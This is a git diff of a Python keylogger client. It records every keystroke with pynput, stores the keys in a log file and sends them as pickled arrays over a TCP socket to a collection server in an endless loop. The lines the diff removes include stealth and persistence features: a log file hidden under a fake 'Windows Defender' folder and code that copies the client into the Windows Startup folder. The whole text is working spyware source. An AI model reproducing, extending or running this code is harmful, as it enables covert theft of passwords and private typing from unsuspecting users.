@@ -1,15 +1,13 @@
 from pynput.keyboard import Listener
-from os import system, getenv, getlogin, makedirs, remove
+from os import system, getenv, getlogin, makedirs, remove, path
 import socket
 from pickle import dumps
 Header = 10
 
 
 class Global:
-    log_file_path = getenv('APPDATA') + "\\Windows Defender\\recvlog.txt"
     key_array = []
     i = 0
-    local_log = False
 
 
 class Logging:
@@ -17,32 +15,37 @@ class Logging:
     def __init__(self, path_to_file):
         self.path = path_to_file
 
-    def return_log(self):
-        # Method to check whether log_file is created and to return its content
+    def return_log(self, only_check=False, return_as_array=False):
+        # Method to check whether log file is created and to return its content
         try:
-            x = open(self.path, "rb")
-            log = x.read()
-        except FileNotFoundError:
-            return None
-        x.close()
-        return log
-
-    def save_log(self, array, create_log=True):
-        # Method to save log and to create it if not present
-        try:
-            if create_log:
-                # create file if not present
-                x = open(self.path, "a+")
-                for char in array:
-                    x.write(char)
-                x.close()
+            if only_check:
+                if path.exists(self.path):
+                    return True
+                else:
+                    return False
             else:
-                # do not create file if not present
-                x = open(self.path, "a")
-                for char in array:
-                    x.write(char)
+                x = open(self.path, "r")
+                log_content = x.read()
                 x.close()
         except(FileNotFoundError, PermissionError):
+            return None
+
+        if return_as_array:
+            temp_array = []
+            for char in log_content:
+                temp_array.append(char)
+            return temp_array
+        return log_content
+
+    def save_log(self, data):
+        # Method to save log
+        try:
+            # create file if not present
+            x = open(self.path, "a+")
+            for char in data:
+                x.write(char)
+            x.close()
+        except (PermissionError, FileNotFoundError):
             return False
         return True
 
@@ -52,7 +55,7 @@ class Logging:
             if rm_file:
                 remove(self.path)
             else:
-                x = open(self.path, "wb")
+                x = open(self.path, "w")
                 x.close()
         except(FileNotFoundError, PermissionError):
             return False
@@ -61,7 +64,7 @@ class Logging:
 
 class Socket:
 
-    connection = False
+    established = False
     cmd_received = False
 
     def connect_to_server(self):
@@ -69,10 +72,10 @@ class Socket:
             self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.active_socket.settimeout(1)
             self.active_socket.connect((socket.gethostname(), 50000))
-            Socket.connection = True
+            Socket.established = True
             print("Connection established")
         except (ConnectionRefusedError, TimeoutError, socket.error):
-            Socket.connection = False
+            Socket.established = False
             print("No connection established!")
 
     def receive_command(self):
@@ -84,85 +87,62 @@ class Socket:
             print("timeout")
             Socket.cmd_received = False
 
-    def send_char(self, char):
-        print(char)
-        char = dumps(char)
-        char = bytes(f"{len(char):{Header}}", "utf-8") + char
-        if Socket.connection:
-            try:
-                self.active_socket.send(char)
-                return True
-            except (ConnectionResetError, ConnectionAbortedError, OSError):
-                return False
-        else:
-            return False
-
     def send_array(self, array):
-        if Socket.connection:
+        if Socket.established:
             array = dumps(array)
             array = bytes(f"{len(array):{Header}}", "utf-8") + array
             try:
                 self.active_socket.send(array)
-                Socket.connection = True
+                Socket.established = True
             except(ConnectionResetError, ConnectionAbortedError, OSError):
-                Socket.connection = False
+                Socket.established = False
 
 
-def no_safe_key_press(key):
-    key = str(key).replace("'", "")
-    key = dumps(key)
-    key = bytes(f"{len(key):{Header}}", "utf-8") + key
-    send = connection_established.send_char(key)
-    if not send:
-        Global.key_array.append(key)
-        Socket.connection = False
-        return False
-
-
-def safe_key_press(key):
+def key_press(key):
     key = str(key).replace("'", "")
     Global.key_array.append(key)
     Global.i += 1
-    if Global.i == 20:
+    if Global.i == 40:
         Global.i = 0
         return False
 
 
-def copy_to_startup(file_name):
-    file_name = "file.pyw"
-    path = str(getenv("SystemDrive") + "\\Users\\" + getlogin() + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\" + file_name)
-    print(path)
-    with open(path, "w+")as f:
-        with open("blanc_client.txt", "r")as x:
-            blanc = x.read()
-        f.write(blanc)
-
-
-connection_established = Socket()
-copy_to_startup("wasd")
+# Main Loop
+connection = Socket()
+log_file = Logging("log.txt")
 while True:
-    if not Socket.connection:
-        connection_established.connect_to_server()
+    # Try to establish connection to server
+    if not connection.established:
+        connection.connect_to_server()
 
-#    if not Socket.cmd_received:
-#        connection_established.receive_command()
-    if Socket.connection and not Global.local_log:
-        with Listener(on_press=no_safe_key_press)as f:
-            f.join()
+    # start key listener
+    with Listener(on_press=key_press)as f:
+        f.join()
 
-    elif Socket.connection and Global.local_log:
-        connection_established.send_array(get_log())
-        if Socket.connection:
-            empty_log()
+    if connection.established:
+        # if log could not be saved continue
+        x = log_file.save_log(Global.key_array)
+        if not x:
+            continue
+        # Empty temporary array
+        Global.key_array = []
+        # Read log_file content
+        log = log_file.return_log(return_as_array=True)
+        if not log:
+            continue
+        # Send array to server
+        connection.send_array(log)
 
-    elif not Socket.connection:
-        with Listener(on_press=safe_key_press)as f:
-            f.join()
-        Global.key_array.append("Lost")
-        save_log(Global.key_array)
+        # If send successfully empty log_file
+        if connection.established:
+            log_file.empty_log()
+
+    else:
+        x = log_file.save_log(Global.key_array)
+        if not x:
+            continue
+        # Empty temporary array
         Global.key_array = []
 
-# Log Datei mit Übergabe richtig machen
-# Log Datei akutaliesiren bzw löschen nachdem gesendet wurde
-# Am Anfang gucken ob Log Datei leer oder voll ist
-# Sendet chars obwohl connection nicht da ist
+
+
